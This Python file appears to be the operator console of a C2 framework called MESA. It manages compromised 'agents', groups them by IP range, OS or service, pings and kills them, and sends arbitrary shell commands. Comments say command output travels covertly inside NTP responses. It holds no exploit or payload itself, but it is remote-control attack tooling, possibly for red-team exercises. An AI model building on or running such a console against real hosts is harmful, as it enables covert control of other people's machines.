from teamserver import teamserver
from server import c2

from prompt_toolkit import prompt
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.completion import WordCompleter
from termcolor import colored

from os import system


def mesaPrompt(TS): #TS is teamserver object
    f = open("textfiles/logo.txt", "r")
    reading = f.read()
    print(colored(reading, "red"))
    print('\nEnter "help" for list of commands.\n')

    baseCMDs = ['agents', 'db', 'interact', 'clear', 'help', 'exit', 'shutdown'] 
    MesaCompleter = WordCompleter(baseCMDs,
                                  ignore_case=True)

    while True:
        user_input = (prompt("MESA ~ ",
                             history=FileHistory('textfiles/history.txt'),
                             auto_suggest=AutoSuggestFromHistory(),
                             completer=MesaCompleter
                             )).lower()

        if user_input == "exit":
            print("\nTime, Dr. Freeman?\nIs it really that time again?\n")
            exit()

        elif "interact" in user_input:
            interactHelper(user_input, TS)

        else:
            ops = {
                "agents": (TS.displayBoard, "nothing"), 
                "db": (dbPrompt, TS), #TODO add git extension?
                "clear": (system, "clear"),
                "help": (mesaHelp, "nothing"),
                "shutdown": (TS.shutdown, "nothing"),
                "": (doNothing,"nothing"), #equal to pass 
            }
            
            obtained = ops.get(user_input, invalid_op)
            if obtained == invalid_op:
                obtained()

            else:
                fctn = obtained[0]
                args = obtained[1]

                if args == "nothing":
                    fctn()
                else:
                    fctn(args)


def mesaHelp():
    print('Base Command List')
    print(colored(" agents ~ display the board of agent entries.\n "
                    "db ~ enter the database subprompt.\n "
                    "interact <A[GENT]/O[S]/S[ERVICE]> <id> ~ enter the interact subprompt. Ping/kill agents, or enter the CMD subprompt here.\n "
                    "help ~ display this list of commands.\n "
                    "exit ~ quit the program, state will be saved.\n "
                    "shutdown ~ quit the program, all agents are killed, database is cleaned.\n",
                    'yellow'))


def interactHelper(user_input, TS):
    arr = user_input.split(' ')
    try: 
        if arr[1] == "agent" or arr[1] == "a":
            dbType = "agentid"
            interactType = "agent"

        elif arr[1] == "os" or arr[1] == "o":
            dbType = "os"
            interactType = "os"

        elif arr[1] == "service" or arr[1] == "s":
            dbType = "service"
            interactType = "service"

        else:
            raise Exception
        
        data = TS.getDBObj().pullSpecific(dbType, arr[2])
        if len(data) == 0:
            print(colored(f" {interactType} \"{arr[2]}\" does not exist.\n", "yellow"))
            return

        interactPrompt(interactType, arr[2], TS)

    except Exception:
        print(colored("Incorrect arguments given.\n SYNTAX: interact <A[GENT]/O[S]/S[ERVICE]> <id>\n", 'yellow'))


def dbPrompt(TS):
    dbCMDs = ['group', 'agents', 'removeall', 'help', 'meta', 'back']
    dbCompleter = WordCompleter(dbCMDs,
                                ignore_case=True)
    while True:
        user_input = (prompt("MESA {DB} ~ ",
                             history=FileHistory('textfiles/history.txt'),
                             auto_suggest=AutoSuggestFromHistory(),
                             completer=dbCompleter
                             )).lower()

        if user_input == "back":
            return

        if "group" in user_input:
            arr = user_input.split(' ')
            try: 
                TS.getDBObj().addGrouping(arr[1], arr[2], arr[3]) 
            except Exception:
                print(colored("Incorrect syntax. Should be \'group <ip> <os/service> <name>\'", 'yellow'))
        else:
            ops = {
                "agents": (TS.displayBoard, "nothing"), 
                "removeall": (removeallHelper, TS), 
                "clear": (system, "clear"),
                "help": (dbHelp, "nothing"),
                "meta": (TS.getDBObj().describe, "nothing"),
                "": (doNothing,"nothing"), #equal to pass 
            }
            
            obtained = ops.get(user_input, invalid_op)
            if obtained == invalid_op:
                obtained()

            else:
                fctn = obtained[0]
                args = obtained[1]

                if args == "nothing":
                    fctn()
                else:
                    fctn(args)


def dbHelp():
    print('DB Subcommand List')
    print(colored(" group <ip> <os/service> <name> ~ add a service identifier to an agent. Can specify a IP range. Ex. \"group 10.1.1-15.3 service SMB\"\n "
                    "agents ~ list all agent entries.\n " 
                    "removeall ~ remove all agents from the database.\n " 
                    "meta ~ describe the agent tables metadata.\n "
                    "help ~ display this list of commands.\n "
                    "back ~ return to the main prompt.\n",
                    'yellow'))


def removeallHelper(TS):
    confirmation = (input("Confirm (y/n)? ")).lower()
    if confirmation == "y":
        TS.getDBObj().removeAllAgents()

    elif confirmation == "n":
        pass #back to prompt


def interactPrompt(interactType, id, TS):
    interactCMDs = ['ping', 'kill', 'cmd', 'agents', 'help', 'back']
    interactCompleter = WordCompleter(interactCMDs,
                                ignore_case=True)
    while True:
        user_input = (prompt("MESA {"+interactType+"/"+id+"} ~ ",
                             history=FileHistory('textfiles/history.txt'),
                             auto_suggest=AutoSuggestFromHistory(),
                             completer=interactCompleter
                             )).lower()

        if user_input == "back":
            return

        elif user_input == "ping":
            c2.sendRefCMD(TS, interactType, id, "PING")

        elif user_input == "cmd":
            cmdPrompt(TS, interactType, id)

        elif user_input == "agents":
            TS.displayBoard(all=False, interactType=interactType, id=id)
        
        elif user_input == "kill":
            killHelper(TS, interactType, id)

        elif user_input == "":
            continue

        elif user_input == "clear":
            system("clear")
        
        elif user_input == "help":
            interactHelp()
        
        else:
            invalid_op()


def killHelper(TS, interactType, id):
    confirmation = (input("Confirm (y/n)? ")).lower()
    if confirmation == "y":
        c2.sendRefCMD(TS, interactType, id, "KILL")

    return #back to interact prompt


def interactHelp():
    print('Interact Subcommand List')
    print(colored(" ping ~ ping agent.\n "
                    "kill ~ send kill command to agent. confirmed with y/n.\n "
                    "cmd ~ enter the cmd subprompt.\n "
                    "agents ~ display agents under the interact filters.\n "
                    "help ~ display this list of commands.\n "
                    "back ~ return to the main prompt.\n",
                    'yellow'))


def cmdPrompt(TS, interactType, id):
    cmds = ['help','back']
    cmdCompleter = WordCompleter(cmds,
                                ignore_case=True)
    while True:
        user_input = (prompt("MESA {"+interactType+"/"+id+"/CMD} ~ ",
                             history=FileHistory('textfiles/history.txt'),
                             auto_suggest=AutoSuggestFromHistory(),
                             completer=cmdCompleter
                             )).lower()

        if user_input == "back":
            return

        elif user_input == "":
            continue

        elif user_input == "clear":
            system('clear')
        
        elif user_input == "help":
            cmdHelp()

        else:
            #TODO sending quotes (and other chars) is being weird, fix this
            #TODO on client, make command run in background (ie linux &)?
            c2.sendCMD(TS, user_input, interactType, id) 
            
            #C: get output and encode in NTP response
            #S: decode output
            #S: send output to TS
            #TS: print output in prompt


def cmdHelp():
    print('Subcommand List')
    print(colored(" <CMD> ~ send CMD to agent.\n "
                    "help ~ display this list of commands.\n "
                    "back ~ return to the interact prompt.\n",
                    'yellow'))


def doNothing():
    pass


def invalid_op():
    print(colored(' Command not recognized. Enter \"help\" for command list.\n', 'red'))